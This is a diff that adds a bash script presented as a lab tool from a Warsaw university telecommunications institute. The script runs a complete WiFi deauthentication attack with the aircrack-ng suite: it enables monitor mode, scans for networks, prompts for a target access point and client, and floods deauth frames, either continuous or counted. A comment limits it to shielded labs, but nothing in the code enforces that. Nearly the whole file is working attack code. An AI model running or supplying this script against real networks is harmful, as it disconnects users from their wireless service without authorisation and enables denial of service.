@@ -1,0 +1,142 @@
+#!/bin/bash
+
+# WiFi Deauth Attack Script for Lab Testing
+# Institute of Telecommunications - Warsaw University of Technology
+# USE ONLY IN SHIELDED LAB ENVIRONMENT
+
+# Color codes for output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+NC='\033[0m' # No Color
+
+# Check if running as root
+
+echo -e "${BLUE}========================================${NC}"
+echo -e "${BLUE}  WiFi Deauth Attack - Lab Tool${NC}"
+echo -e "${BLUE}========================================${NC}"
+echo ""
+
+# Step 1: Check wireless interface
+echo -e "${YELLOW}[*] Step 1: Checking wireless interfaces...${NC}"
+iwconfig 2>/dev/null | grep -o "^\w*" | grep -v "lo\|eth"
+echo ""
+read -p "Enter your wireless interface (e.g., wlan0): " IFACE
+
+if [ -z "$IFACE" ]; then
+    echo -e "${RED}[!] No interface specified. Exiting.${NC}"
+    exit 1
+fi
+
+echo -e "${GREEN}[+] Using interface: $IFACE${NC}"
+echo ""
+
+# Step 2: Kill interfering processes
+echo -e "${YELLOW}[*] Step 2: Killing interfering processes...${NC}"
+airmon-ng check kill
+echo -e "${GREEN}[+] Processes killed${NC}"
+echo ""
+
+# Step 3: Enable monitor mode
+echo -e "${YELLOW}[*] Step 3: Enabling monitor mode on $IFACE...${NC}"
+airmon-ng start $IFACE
+MON_IFACE="${IFACE}mon"
+echo -e "${GREEN}[+] Monitor mode enabled: $MON_IFACE${NC}"
+echo ""
+
+# Step 4: Scan for networks
+echo -e "${YELLOW}[*] Step 4: Scanning for networks...${NC}"
+echo -e "${BLUE}[i] Press Ctrl+C after 10-15 seconds to stop scanning${NC}"
+timeout 15 airodump-ng $MON_IFACE || airodump-ng $MON_IFACE &
+SCAN_PID=$!
+sleep 15
+kill $SCAN_PID 2>/dev/null
+echo ""
+
+# Step 5: Get target information
+echo -e "${YELLOW}[*] Step 5: Enter target information...${NC}"
+read -p "Enter target AP MAC address (BSSID): " AP_MAC
+read -p "Enter channel number: " CHANNEL
+read -p "Enter client MAC (leave empty for all clients): " CLIENT_MAC
+echo ""
+
+if [ -z "$AP_MAC" ]; then
+    echo -e "${RED}[!] AP MAC address is required. Exiting.${NC}"
+    # Cleanup
+    airmon-ng stop $MON_IFACE
+    systemctl start NetworkManager
+    exit 1
+fi
+
+# Step 6: Monitor specific network (optional)
+echo -e "${YELLOW}[*] Step 6: Monitoring target network...${NC}"
+echo -e "${BLUE}[i] Monitoring channel $CHANNEL, BSSID $AP_MAC${NC}"
+echo -e "${BLUE}[i] Press Ctrl+C after 10 seconds to continue${NC}"
+timeout 10 airodump-ng -c $CHANNEL --bssid $AP_MAC $MON_IFACE || airodump-ng -c $CHANNEL --bssid $AP_MAC $MON_IFACE &
+MON_PID=$!
+sleep 10
+kill $MON_PID 2>/dev/null
+echo ""
+
+# Step 7: Choose attack type
+echo -e "${YELLOW}[*] Step 7: Select deauth attack type...${NC}"
+echo "1) Deauth all clients (continuous)"
+echo "2) Deauth all clients (limited packets)"
+echo "3) Deauth specific client (continuous)"
+echo "4) Deauth specific client (limited packets)"
+read -p "Choose option (1-4): " ATTACK_TYPE
+echo ""
+
+# Step 8: Execute attack
+echo -e "${YELLOW}[*] Step 8: Launching deauth attack...${NC}"
+echo -e "${RED}[!] ATTACK STARTING - Press Ctrl+C to stop${NC}"
+echo ""
+
+case $ATTACK_TYPE in
+    1)
+        echo -e "${BLUE}[i] Continuous deauth attack on all clients of $AP_MAC${NC}"
+        aireplay-ng --deauth 0 -a $AP_MAC $MON_IFACE
+        ;;
+    2)
+        read -p "Enter number of deauth packets to send: " PACKET_COUNT
+        echo -e "${BLUE}[i] Sending $PACKET_COUNT deauth packets to all clients of $AP_MAC${NC}"
+        aireplay-ng --deauth $PACKET_COUNT -a $AP_MAC $MON_IFACE
+        ;;
+    3)
+        if [ -z "$CLIENT_MAC" ]; then
+            read -p "Enter client MAC address: " CLIENT_MAC
+        fi
+        echo -e "${BLUE}[i] Continuous deauth attack on client $CLIENT_MAC${NC}"
+        aireplay-ng --deauth 0 -a $AP_MAC -c $CLIENT_MAC $MON_IFACE
+        ;;
+    4)
+        if [ -z "$CLIENT_MAC" ]; then
+            read -p "Enter client MAC address: " CLIENT_MAC
+        fi
+        read -p "Enter number of deauth packets to send: " PACKET_COUNT
+        echo -e "${BLUE}[i] Sending $PACKET_COUNT deauth packets to client $CLIENT_MAC${NC}"
+        aireplay-ng --deauth $PACKET_COUNT -a $AP_MAC -c $CLIENT_MAC $MON_IFACE
+        ;;
+    *)
+        echo -e "${RED}[!] Invalid option. Exiting.${NC}"
+        ;;
+esac
+
+echo ""
+echo -e "${GREEN}[+] Attack completed${NC}"
+echo ""
+
+# Step 9: Cleanup
+echo -e "${YELLOW}[*] Step 9: Cleaning up...${NC}"
+echo -e "${BLUE}[i] Stopping monitor mode${NC}"
+airmon-ng stop $MON_IFACE
+
+echo -e "${BLUE}[i] Restarting NetworkManager${NC}"
+systemctl start NetworkManager
+
+echo ""
+echo -e "${GREEN}[+] Cleanup complete. Interface restored to normal mode.${NC}"
+echo -e "${BLUE}========================================${NC}"
+echo -e "${BLUE}  Lab test completed${NC}"
+echo -e "${BLUE}========================================${NC}"
